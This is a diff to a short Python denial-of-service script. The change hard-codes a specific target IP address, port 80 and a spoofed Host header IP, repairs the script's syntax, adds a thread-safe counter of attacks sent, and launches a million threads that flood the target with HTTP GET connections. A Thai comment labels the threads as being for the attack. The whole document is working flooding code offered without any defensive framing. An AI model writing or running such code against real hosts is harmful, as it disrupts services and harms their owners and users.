@@ -1,24 +1,31 @@
 import socket
 import threading
 
-target = str(input("Insert target’s IP: "))
-port = int(input("Insert Port: "))
-Trd = int(input("Insert number of Threads: "))
-fake_ip = '44.197.175.168'
+target = '202.28.1.60'
+fake_ip = '182.21.20.32'
+port = 80 
+attack_num = 0
+lock = threading.Lock()
 
 def attack():
- while True:
- s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
- s.connect((target, port))
- s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode(’ascii’), (target, port))
- s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode(’ascii’), (target, port))
- s.close()
+    global attack_num
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
 
- for i in range(Trd):
- thread = threading.Thread(target=attack)
- thread.start()
- global attack_num
- attack_num += 1
- print(attack_num)
- import os
- 
+            with lock:
+                attack_num += 1
+                print(f"Attack number: {attack_num}")
+
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+
+# สร้างเธรดสำหรับการโจมตี
+for i in range(1000000):
+    thread = threading.Thread(target=attack)
+    thread.start()
